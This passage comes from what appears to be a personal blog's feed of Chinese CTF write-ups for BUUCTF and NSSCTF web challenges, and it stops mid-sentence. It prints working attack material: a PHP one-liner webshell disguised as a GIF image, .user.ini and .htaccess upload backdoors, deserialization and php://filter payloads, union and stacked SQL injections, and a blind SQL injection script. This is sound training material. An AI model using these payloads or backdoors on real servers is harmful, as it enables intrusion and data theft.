class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$op</span> = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span> = <span class="string">&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$content</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">FileHandler</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>)</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>echo 出来的内容 <code>O:11:&quot;FileHandler&quot;:3:&#123;s:2:&quot;op&quot;;i:2;s:8:&quot;filename&quot;;s:57:&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;;s:7:&quot;content&quot;;N;&#125;</code></p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?str=O:11:&quot;FileHandler&quot;:3:&#123;s:2:&quot;op&quot;;i:2;s:8:&quot;filename&quot;;s:57:&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;;s:7:&quot;content&quot;;N;&#125;</span><br></pre></td></tr></table></figure><p><img src="/2024/01/24/buuctf%E5%88%B7%E9%A2%982/b08.png" class="lazyload" data-srcset="/2024/01/24/buuctf%E5%88%B7%E9%A2%982/b08.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>base64 解码得到 <code>&lt;?php $flag='flag&#123;98304339-5192-4713-8bb4-2e5f6dc387e4&#125;';</code></p><h2 id="suctf-2019checkin"><a class="markdownIt-Anchor" href="#suctf-2019checkin">#</a> [SUCTF 2019]CheckIn</h2><p>学习链接：<a href="https://blog.csdn.net/RABCDXB/article/details/113623796">https://blog.csdn.net/RABCDXB/article/details/113623796</a></p><p>本题上传一句话木马图片抓包修改后缀，会提示非法后缀，上传.htaccess 文件修改 content-type 会提示不是图片</p><p><code>exif_imagetype:not image!</code></p><p>这里对 exif_imagetype () 函数做一个记录</p><blockquote><p>exif_imagetype</p><p>(PHP 4 &gt;= 4.3.0, PHP 5, PHP 7, PHP 8)</p><p>exif_imagetype () 判断一个图像的类型<br>说明</p><p>exif_imagetype ( string $filename ) : int</p><p>exif_imagetype () 读取一个图像的第一个字节并检查其签名。</p></blockquote><p>检查签名的话就会想到文件头幻术</p><p>就是在文件前面添加 GIF89a 以达到绕过的目的，直接上传一句话木马图片会显示</p><p><code>&lt;? in contents!</code>  说明会提取内容来，不能出现 <code>&lt;?</code></p><p>一句话木马图片内容如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF86a</span><br><span class="line">&lt;script language=&quot;php&quot;&gt;@eval($_POST[&#x27;1&#x27;]);&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>然后上传图片</p><p><img src="/2024/01/24/buuctf%E5%88%B7%E9%A2%982/b09.png" class="lazyload" data-srcset="/2024/01/24/buuctf%E5%88%B7%E9%A2%982/b09.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>因为上传的是图片马，所以现在还需要一个解析，所以用上了 user.ini</p><p>这里做一些.user.ini 的记录：</p><blockquote><p>什么是 <code>.user.ini</code> ？</p><p>这得从 php.ini 说起了。php.ini 是 php 默认的配置文件，其中包括了很多 php 的配置，这些配置中，又分为几种： <code>PHP_INI_SYSTEM</code> 、 <code>PHP_INI_PERDIR</code> 、 <code>PHP_INI_ALL</code> 、 <code>PHP_INI_USER</code> 。这几种模式的区别，官方解释如下：</p><p>​*<em>PHP_INI_<em>模式的定义</em></em></p><table><thead><tr><th>模式</th><th>含义</th></tr></thead><tbody><tr><td>PHP_INI_USER</td><td>可在用户脚本（例如 ini_set ()）或 Windows 注册表（自 PHP5.3 起）以及.user.ini 中设定</td></tr><tr><td>PHP_INI_PERDIR</td><td>可在 php.ini，.htaccess 或 httpd.conf 中设定</td></tr><tr><td>PHP_INI_SYSTEM</td><td>可在 php.ini 或 httpd.conf 中设定</td></tr><tr><td>PHP_INI_ALL</td><td>可在任何地方设定</td></tr></tbody></table><p>其中就提到了，模式为 PHP_INI_USER 的配置项，可以在 ini_set () 函数中设置、注册表中设置，再就是.user.ini 中设置。 这里就提到了.user.ini，那么这是个什么配置文件？那么官方文档在 https://www.php.net/manual/zh/configuration.file.per-user.php 里面解释了。</p><p>除了主 php.ini 之外，PHP 还会在每个目录下扫描 INI 文件，从被执行的 PHP 文件所在目录开始一直上升到 web 根目录（$_SERVER [‘DOCUMENT_ROOT’] 所指定的）。如果被执行的 PHP 文件在 web 根目录之外，则只扫描该目录。</p><p>在 .user.ini 风格的 INI 文件中只有具有 PHP_INI_PERDIR 和 PHP_INI_USER 模式的 INI 设置可被识别。</p><p>这里就很清楚了，.user.ini 实际上就是一个可以由用户 “自定义” 的 php.ini，我们能够自定义的设置是模式为 “PHP_INI_PERDIR 、 PHP_INI_USER” 的设置。（上面表格中没有提到的 PHP_INI_PERDIR 也可以在.user.ini 中设置）</p><p>实际上，除了 PHP_INI_SYSTEM 以外的模式（包括 PHP_INI_ALL）都是可以通过.user.ini 来设置的。</p><p>而且，和 php.ini 不同的是，.user.ini 是一个能被动态加载的 ini 文件。也就是说我修改了.user.ini 后，不需要重启服务器中间件，只需要等待 user_ini.cache_ttl 所设置的时间（默认为 300 秒），即可被重新加载。</p><p>然后我们看到 php.ini 中的配置项，但是，只要稍微敏感的配置项，都是 PHP_INI_SYSTEM 模式的（甚至是 php.ini only 的），包括 disable_functions、extension_dir、enable_dl 等。 不过，我们可以很容易地借助.user.ini 文件来构造一个 “后门”。<br>Php 配置项中有两个比较有意思的项（下图第一、四个）</p><p><img src="/2024/01/24/buuctf%E5%88%B7%E9%A2%982/b10.png" class="lazyload" data-srcset="/2024/01/24/buuctf%E5%88%B7%E9%A2%982/b10.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p><code>auto_append_file，</code> 指定一个文件，自动包含在要执行的文件前，类似于在文件前调用了 require () 函数。而 auto_append_file 类似，只是在文件后面包含。 使用方法很简单，直接写在.user.ini 中：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auto_prepend_file=muma.jpg</span><br></pre></td></tr></table></figure><p>muma.jpg 是要包含的文件。所以，可以借助.user.ini 轻松让所有 php 文件都 “自动” 包含某个文件，而这个文件可以是一个正常 php 文件，也可以是一个包含一句话的 webshell。</p></blockquote><p>新建一个.user.ini 内容为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">auto_prepend_file=muma.jpg</span><br></pre></td></tr></table></figure><p>也需要 GIF89a 来绕过检测</p><p>上传，这里是 <code>.user.ini</code>  不能漏了前面那个点，我第一次漏了，一直失败，图片就不改了，一定记住不能少了两个 <code>.</code></p><p><img src="/2024/01/24/buuctf%E5%88%B7%E9%A2%982/b11.png" class="lazyload" data-srcset="/2024/01/24/buuctf%E5%88%B7%E9%A2%982/b11.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>回显路径了，接着上传木马图片</p><p><img src="/2024/01/24/buuctf%E5%88%B7%E9%A2%982/b12.png" class="lazyload" data-srcset="/2024/01/24/buuctf%E5%88%B7%E9%A2%982/b12.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>尝试用蚁剑连接，这是连接 index.php 文件，而不知以前遇到的连接一句话木马图片或者一句话木马 php 文件</p><p><img src="/2024/01/24/buuctf%E5%88%B7%E9%A2%982/b13.png" class="lazyload" data-srcset="/2024/01/24/buuctf%E5%88%B7%E9%A2%982/b13.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>连接成功后就可以在最高一级目录看到 flag</p><h2 id="gxyctf2019babysqli"><a class="markdownIt-Anchor" href="#gxyctf2019babysqli">#</a> [GXYCTF2019]BabySQli</h2><p>查看网页源代码发现一行像是 base 加密的</p><p>MMZFM422K5HDASKDN5TVU3SKOZRFGQRRMMZFM6KJJBSG6WSYJJWESSCWPJNFQSTVLFLTC3CJIQYGOSTZKJ2VSVZRNRFHOPJ5</p><p>先 base32 解码然后再 base64</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from user where username = &#x27;$name&#x27;</span><br></pre></td></tr></table></figure><p>利用 bp 的 repeater 来做题，随便输入一个 name 和 passwd 根据上面的 hint 可以知道是单引号闭合所以 <code>name=admin'#&amp;pw=1</code>  就能闭合，显示 wrong pass！</p><p>判断字段数，这道题 order 被过滤了但是可以大小写绕过 Order by 就可以</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name=1&#x27;union select 1,2,3#&amp;pw=1</span><br></pre></td></tr></table></figure><p><img src="/2024/01/24/buuctf%E5%88%B7%E9%A2%982/b15.png" class="lazyload" data-srcset="/2024/01/24/buuctf%E5%88%B7%E9%A2%982/b15.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p><img src="/2024/01/24/buuctf%E5%88%B7%E9%A2%982/b16.png" class="lazyload" data-srcset="/2024/01/24/buuctf%E5%88%B7%E9%A2%982/b16.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>可以知道字段数为 3</p><p>这题给了源代码 https://github.com/imaginiso/GXY_CTF/tree/master/Web/BabySqli</p><p>通过这个可以在 search.php 看到这段代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">if($arr[1] == &quot;admin&quot;)&#123;</span><br><span class="line">if(md5($password) == $arr[2])&#123;</span><br><span class="line">echo $flag;![b17](E:/Screenshots/b17.png)</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">die(&quot;wrong pass!&quot;);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看了很多 wp 得到的解法：</p><p><strong>在联合查询并不存在的数据时，联合查询就会构造一个虚拟的数据。</strong></p><p><img src="/2024/01/24/buuctf%E5%88%B7%E9%A2%982/b18.png" class="lazyload" data-srcset="/2024/01/24/buuctf%E5%88%B7%E9%A2%982/b18.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>可以看到在我查询 admin 时，他临时添加了一个 admin 密码是 md5 (123)，这样我们可以尝试使用联合注入来新建一个 admin 的账户密码，混淆 admin 的密码，这道题我用的密码是 md5 (1)，md5 把 1 加密后为 c4ca4238a0b923820dcc509a6f75849b</p><p>首先需要查找 admin 再哪个字段，其实猜测就知道 username 一般是在第二个</p><p><code>1' union select 'admin',2,3#</code> 发现 user 错误</p><p><code>1' union select 1,'admin',3#</code> 发现 password 错误，所以第二个字段是 admin</p><p>name = 后面跟着的不可以是 admin，应该要是不存在数据库中的用户名，为什么需要不存在数据库中的用户名，可以参考这个文章：<a href="https://blog.csdn.net/qq_23667585/article/details/127213099">浅谈 SQL 注入中的 - 1‘ union select 1,2,3#-CSDN 博客</a>应该是和 - 1 同一个道理</p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name=1&#x27;union select 1,&#x27;admin&#x27;,&#x27;c4ca4238a0b923820dcc509a6f75849b&#x27;#&amp;pw=1</span><br></pre></td></tr></table></figure><p><img src="/2024/01/24/buuctf%E5%88%B7%E9%A2%982/b17.png" class="lazyload" data-srcset="/2024/01/24/buuctf%E5%88%B7%E9%A2%982/b17.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p a3e58c1d-5485-4c8d-b4eb-55fcd341c0cd>flag</p><h2 id="gyctf2020blacklist"><a class="markdownIt-Anchor" href="#gyctf2020blacklist">#</a> [GYCTF2020]Blacklist</h2><p>查询数据库</p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?inject=1&#x27;;show databases;#</span><br></pre></td></tr></table></figure><p><img src="/2024/01/24/buuctf%E5%88%B7%E9%A2%982/b19.png" class="lazyload" data-srcset="/2024/01/24/buuctf%E5%88%B7%E9%A2%982/b19.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>查表名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?inject=1&#x27;;show tables;#</span><br></pre></td></tr></table></figure><p><img src="/2024/01/24/buuctf%E5%88%B7%E9%A2%982/b20.png" class="lazyload" data-srcset="/2024/01/24/buuctf%E5%88%B7%E9%A2%982/b20.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>查 FlagHere 表里的字段名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?inject=1&#x27;;show columns from FlagHere;#</span><br></pre></td></tr></table></figure><p><img src="/2024/01/24/buuctf%E5%88%B7%E9%A2%982/b21.png" class="lazyload" data-srcset="/2024/01/24/buuctf%E5%88%B7%E9%A2%982/b21.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>做个记录（虽然本题没用上）：</p><blockquote><p>/**/ 可以绕过检查</p><p>例如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;;sel/**/ect flag from FlagHere;#</span><br></pre></td></tr></table></figure><p>但是本题什么都没查出来</p></blockquote><p>本题用的是 HANDLER</p><blockquote><p><code>HANDLER ... OPEN</code>  语句打开一个表，使其可以使用后续 <code>HANDLER ... READ</code>  语句访问，该表对象未被其他会话共享，并且在会话调用 <code>HANDLER ... CLOSE</code>  或会话终止之前不会关闭</p><p>handler 语句，一行一行的浏览一个表中的数据</p><p>handler 语句并不具备 select 语句的所有功能。</p><p>mysql 专用的语句，并没有包含到 SQL 标准中。<br>HANDLER 语句提供通往表的直接通道的存储引擎接口，可以用于 MyISAM 和 InnoDB 表。</p></blockquote><p>1、 <code>HANDLER tbl_name OPEN</code></p><p>打开一张表，无返回结果，实际上我们在这里声明了一个名为 tb1_name 的句柄。</p><p>2、 <code>HANDLER tbl_name READ FIRST</code></p><p>获取句柄的第一行，通过 READ NEXT 依次获取其它行。最后一行执行之后再执行 NEXT 会返回一个空的结果。</p><p>3、 <code>HANDLER tbl_name CLOSE</code></p><p>关闭打开的句柄。</p><p>4、 <code>HANDLER tbl_name READ index_name = value</code></p><p>通过索引列指定一个值，可以指定从哪一行开始，通过 NEXT 继续浏览。</p><p>所以构建 payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?inject=1&#x27;;HANDLER FlagHere OPEN;HANDLER FlagHere READ FIRST;HANDLER FlagHere CLOSE;#</span><br></pre></td></tr></table></figure><p><img src="/2024/01/24/buuctf%E5%88%B7%E9%A2%982/b22.png" class="lazyload" data-srcset="/2024/01/24/buuctf%E5%88%B7%E9%A2%982/b22.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p 763d9188-487b-4821-8dee-1c71c67db52d>flag</p><h2 id="ciscn2019-华北赛区-day2-web1hack-world"><a class="markdownIt-Anchor" href="#ciscn2019-华北赛区-day2-web1hack-world">#</a> [CISCN2019 华北赛区 Day2 Web1] Hack World</h2><p>本题过滤了很多字符，且错误不会先只会回显 bool 值，所以使用盲注，题目蚁剑名牌告诉我们需要的在表 flag 字段名也叫 flag。</p><p>尝试写一下脚本，学习链接 https://blog.csdn.net/qq_45691294/article/details/108709683</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://50aabff9-6616-4456-b9e1-5af870c44f8b.node5.buuoj.cn:81/index.php&quot;</span></span><br><span class="line">payload = &#123;<span class="string">&quot;id&quot;</span> : <span class="string">&quot;&quot;</span>&#125;</span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">l = <span class="number">33</span></span><br><span class="line">r =<span class="number">130</span></span><br><span class="line">mid = (l+r)&gt;&gt;<span class="number">1</span></span><br><span class="line"><span class="keyword">while</span>(l&lt;r):</span><br><span class="line">payload[<span class="string">&quot;id&quot;</span>] = <span class="string">&quot;0^&quot;</span> + <span class="string">&quot;(ascii(substr((select(flag)from(flag)),&#123;0&#125;,1))&gt;&#123;1&#125;)&quot;</span>.<span class="built_in">format</span>(i,mid)</span><br><span class="line">html = requests.post(url,data=payload)</span><br><span class="line"><span class="built_in">print</span>(payload)</span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;Hello&quot;</span> <span class="keyword">in</span> html.text:</span><br><span class="line">l = mid+<span class="number">1</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">r = mid</span><br><span class="line">mid = (l+r)&gt;&gt;<span class="number">1</span></span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">chr</span>(mid)==<span class="string">&quot; &quot;</span>):</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">result = result + <span class="built_in">chr</span>(mid)</span><br><span class="line"><span class="built_in">print</span>(result)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;flag: &quot;</span> ,result)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p f7419511-67a5-4b71-9ec2-3bcca4a4256e>flag</p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;极客大挑战-2019upload&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#极客大挑战-2019upload&quot;&gt;#&lt;/a&gt; [极客大挑战 2019] Upload&lt;/h2&gt;</summary>
    
    
    
    <category term="buuctf" scheme="https://dr4x3zz.github.io/categories/buuctf/"/>
    
    
    <category term="buuctf" scheme="https://dr4x3zz.github.io/tags/buuctf/"/>
    
  </entry>
  
  <entry>
    <title>NSSCTF刷题2</title>
    <link href="https://dr4x3zz.github.io/2024/01/20/NSSCTF%E5%88%B7%E9%A2%982/"/>
    <id>https://dr4x3zz.github.io/2024/01/20/NSSCTF%E5%88%B7%E9%A2%982/</id>
    <published>2024-01-20T08:25:14.000Z</published>
    <updated>2024-01-26T08:28:32.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="nisactf-2022easyssrf"><a class="markdownIt-Anchor" href="#nisactf-2022easyssrf">#</a> [NISACTF 2022]easyssrf</h2><span id="more"></span><p>进入本题可以看到 curl 一下，输入 url 查询一下就可以回显页面，可以尝试输入 flag，页面告诉我们</p><p><code>都说了这里看不了flag。。但是可以看看提示文件：/fl4g</code></p><p>输入 /fl4g，让我们尝试其他路径，使用 file 协议读取文件？</p><p>file:///fl4g</p><p><code>file:///fl4g 的快照如下：</code></p><p><code>你应该看看除了index.php，是不是还有个ha1x1ux1u.php</code></p><p><img src="/2024/01/20/NSSCTF%E5%88%B7%E9%A2%982/a1.png" class="lazyload" data-srcset="/2024/01/20/NSSCTF%E5%88%B7%E9%A2%982/a1.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>stristr () 函数用于搜索一个字符串在另一个字符串中第一次出现的位置。(不区别大小写)</p><p>语法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">stristr(str, search, before_search)</span><br></pre></td></tr></table></figure><p>参数</p><ul><li><strong>str</strong> - 要搜索的字符串</li><li><strong>search</strong> - 要搜索的字符串</li><li><strong>before_search</strong> - 一个布尔值，默认值为 “false”。如果设置为 “true”，则返回第一次出现搜索参数之前的字符串部分。</li></ul><p>阅读代码发现 file 被禁用，使用 php 伪协议 php://filter</p><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ha1x1ux1u.php?file=php://filter/read=convert.base64-encode/resource=/flag</span><br></pre></td></tr></table></figure><p><img src="/2024/01/20/NSSCTF%E5%88%B7%E9%A2%982/a2.png" class="lazyload" data-srcset="/2024/01/20/NSSCTF%E5%88%B7%E9%A2%982/a2.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="a2"></p><p>解码得到 flag</p><p 95024f7a-aa03-4106-a141-6354f67ddfa5>NSSCTF</p><h2 id="nctf-2018签到题"><a class="markdownIt-Anchor" href="#nctf-2018签到题">#</a> [NCTF 2018] 签到题</h2><p>bp 抓包访问 index.php，flag 藏在响应头里</p><p><img src="/2024/01/20/NSSCTF%E5%88%B7%E9%A2%982/a3.png" class="lazyload" data-srcset="/2024/01/20/NSSCTF%E5%88%B7%E9%A2%982/a3.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><h2 id="bjdctf-2020easy_md5"><a class="markdownIt-Anchor" href="#bjdctf-2020easy_md5">#</a> [BJDCTF 2020]easy_md5</h2><p>进入页面只有一个白色查询框，输入 1，可以看见 url 上多了 password=1，可能和注入以及题目说的 md5 结合起来，弱比较？</p><p>在响应头看到 hint</p><p><img src="/2024/01/20/NSSCTF%E5%88%B7%E9%A2%982/a4.png" class="lazyload" data-srcset="/2024/01/20/NSSCTF%E5%88%B7%E9%A2%982/a4.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>先记录一下 md5 () 这个函数</p><p><strong>语法</strong></p><p>md5(string, raw)</p><table><thead><tr><th><strong>参数</strong></th><th>描述</th></tr></thead><tbody><tr><td>string</td><td>必须。要计算的字符串。</td></tr><tr><td>raw</td><td>可选。<br>默认不写为 FALSE。32 位 16 进制的字符串<br>TURE。16 位原始二进制格式的字符串</td></tr></tbody></table><p>当 raw 为 ture 时，返回的原始二进制不是 0 和 1 构成的，而是’or’6\xc9]\x99\xe9!r,\xf9\xedb\x1c 这种</p><p>上面这一长串是 ffifdyop 这串字符通过 md5 (,true) 加密后得到的，因为有’or’6… 可以和 hint 中的 sql 语句构成一条常规的 sql 注入从而绕过</p><p>测试</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo md5(&quot;ffifdyop&quot;, true)</span><br></pre></td></tr></table></figure><p><img src="/2024/01/20/NSSCTF%E5%88%B7%E9%A2%982/a5.png" class="lazyload" data-srcset="/2024/01/20/NSSCTF%E5%88%B7%E9%A2%982/a5.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>ok 输入 ffifdyop</p><p><img src="/2024/01/20/NSSCTF%E5%88%B7%E9%A2%982/a6.png" class="lazyload" data-srcset="/2024/01/20/NSSCTF%E5%88%B7%E9%A2%982/a6.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>查看网页源代码</p><p><img src="/2024/01/20/NSSCTF%E5%88%B7%E9%A2%982/a7.png" class="lazyload" data-srcset="/2024/01/20/NSSCTF%E5%88%B7%E9%A2%982/a7.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>这就是一个 md5 弱类型比较，也可以数组绕过，（直接访问 levell14.php 也行？？？？？？。。。。。。）</p><p>根据提示 payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url/levell14.php?$a=240610708&amp;&amp;$b=s878926199a</span><br></pre></td></tr></table></figure><p>得到新的页面</p><p><img src="/2024/01/20/NSSCTF%E5%88%B7%E9%A2%982/a8.png" class="lazyload" data-srcset="/2024/01/20/NSSCTF%E5%88%B7%E9%A2%982/a8.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>md5 无法处理数组，所以使用数组绕过 md5 的比较</p><p>postaram1[]=1&amp;param2[]=2</p><p f821cee2-da39-43ae-9727-96b642156034>得到 flag<img src="/2024/01/20/NSSCTF%E5%88%B7%E9%A2%982/a9.png" class="lazyload" data-srcset="/2024/01/20/NSSCTF%E5%88%B7%E9%A2%982/a9.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt>NSSCTF</p><h2 id="swpuctf-2021-新生赛easyupload30"><a class="markdownIt-Anchor" href="#swpuctf-2021-新生赛easyupload30">#</a> [SWPUCTF 2021 新生赛] easyupload3.0</h2><blockquote><p>记录一下.htaccess 文件</p><p>htaccess 文件是 Apache 服务中的一个配置文件，它负责相关目录下的网页配置。通过 htaccess 文件，可以帮助我们实现：网页 301 重定向、自定义 404 错误页面、改变文件扩展名、允许 / 阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能</p><p>.htaccess 文件内容： <code>SetHandler application/x-httpd-php</code>  意思是设置当前目录所有文件都是用 php 解析，那么无论上传任何一个文件，内容只要符合 php 的语言规范，就能够当作 php 代码执行。不符合规则报错</p></blockquote><p>先上传一个 htaccess 文件，再上传一个包含一句话木马的 jpg 文件</p><p>htaccess 文件内容为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;jpg&quot;&gt;</span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure><p>包含一句话木马就是 txt 文件写一段一句话木马然后后缀名改为 jpg 就好了</p><p><img src="/2024/01/20/NSSCTF%E5%88%B7%E9%A2%982/b01.png" class="lazyload" data-srcset="/2024/01/20/NSSCTF%E5%88%B7%E9%A2%982/b01.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>上传成功后可以看到路径，蚁剑连接，在 html 文件夹下有 flag.php，里面就是 flag 了</p><p><img src="/2024/01/20/NSSCTF%E5%88%B7%E9%A2%982/b02.png" class="lazyload" data-srcset="/2024/01/20/NSSCTF%E5%88%B7%E9%A2%982/b02.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p fae5b878-8cac-4f20-9267-3d44d525354f>NSSCTF</p><h2 id="swpuctf-2021-新生赛hardrce"><a class="markdownIt-Anchor" href="#swpuctf-2021-新生赛hardrce">#</a> [SWPUCTF 2021 新生赛] hardrce</h2><p><img src="/2024/01/20/NSSCTF%E5%88%B7%E9%A2%982/b03.png" class="lazyload" data-srcset="/2024/01/20/NSSCTF%E5%88%B7%E9%A2%982/b03.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>本题是有两个 preg_match 函数去过滤掉一些字符和所有的英文字母，如果传入的 wllm 